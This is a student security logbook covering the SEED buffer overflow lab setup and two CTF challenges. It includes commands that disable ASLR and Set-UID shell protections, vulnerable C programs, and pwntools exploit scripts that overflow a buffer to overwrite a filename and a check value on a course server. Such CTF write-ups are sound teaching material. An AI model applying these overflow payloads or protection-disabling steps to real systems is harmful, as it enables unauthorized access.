# LOGBOOK 5

## SEED Labs - Buffer Overflow Attack Lab (Set-UID Version)

### Preparation

To prepare our systems for this lab, we followed the Environment Setup section of the guide:

1. Turn off address space randomization for the stack and the heap
   - Execute `sudo sysctl -w kernel.randomize_va_space=0`
   - This command instructs the kernel to stop randomizing the starting addresses of the stack and the heap. This is necessary for this lab because it makes the address at which our shellcode will be located more predictable.

2. Link `/bin/sh` to `/bin/zsh`
   - Execute `sudo ln -sf /bin/zsh /bin/sh`
   - This command is executed because, normally, `/bin/sh` points to `/bin/dash`. Both `dash` and `bash` contain special protections against being executed from a program with the Set-UID bit set, which is the program we will be trying to attack. `zsh`, on the other hand, doesn't have that kind of protections.

### Tasks

The guides for each of the tasks are located at:

- [Task #1](guides/logbook-5/task1.md)
- [Task #2](guides/logbook-5/task2.md)
- [Task #3](guides/logbook-5/task3.md)

## CTF - Desafio 1

### Step 1 - Checksec

By running checksec on the program, we can discover many things:

```bash
❯ checksec program
  Arch:     i386-32-little
  RELRO:    No RELRO
  Stack:    No canary found
  NX:       NX disabled
  PIE:      No PIE (0x8048000)
  RWX:      Has RWX segments    
```

- The executable's architecture is 32 bits and little endian

- There are segments in the memory with Read, Write and Execute Permissions

- Address Space Layout Randomization (ASLR) is disabled

- Position Independent Executable (PIE) is disabled

- NX (No execute) is disabled

- There's no canary

### Analysis

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[20];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%28s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}
```
By analysing the program code, we can easily see that even tho the buffer only has 20 chars space, we are reading 28 with `scanf("%28s", &buffer)` and that overwrites the buffer by 8 bytes. 

Since the user controls the input, by writing `flag.txt` after 20 chars, you can easily overwrite the variable meme_file and open the flag

### Exploitation

```python
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4003)

payload = b"a" * 20 + b"flag.txt"

r.recvuntil(b":")
r.sendline(payload)
r.interactive()
```


## CTF - Desafio 2

### Step 1 - Checksec

By running checksec on the program, we can discover many things:

```bash
❯ checksec program
  Arch:     i386-32-little
  RELRO:    No RELRO
  Stack:    No canary found
  NX:       NX disabled
  PIE:      No PIE (0x8048000)
  RWX:      Has RWX segments    
```

- The executable's architecture is 32 bits and little endian

- There are segments in the memory with Read, Write and Execute Permissions

- Address Space Layout Randomization (ASLR) is disabled

- Position Independent Executable (PIE) is disabled

- NX (No execute) is disabled

- There's no stack canary

### Analysis

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char val[4] = "\xef\xbe\xad\xde";
    char buffer[20];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    if(*(int*)val == 0xfefc2223) {
        printf("I like what you got!\n");
        
        FILE *fd = fopen(meme_file,"r");
        
        while(1){
            if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
                printf("%s", buffer);
            } else {
                break;
            }
        }
    } else {
        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
    }

    fflush(stdout);
    
    return 0;
}
```

This challenge is similar to the first one, with the little twist added that now we can't just overflow the buffer to read the flag.

Like in the first challenge our buffer supports 20 bytes, however, we are reading 32 from user input, which gives us 12 bytes of freedom for our payload.

We need that `val` has the value `0xfefc2223` to proceed with the challenge and, since this one can be found in a memory region in between the buffer and the filename, we just need to overwrite the bytes 20 to 24.

From there on, the challenge is exactly like the previous one.

### Exploitation

```python
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4000)

r.recvuntil(b":")

payload = b"aaaaaaaaaaaaaaaaaaaa" + p32(0xfefc2223) + b"flag.txt"


r.sendline(payload)
r.interactive()
```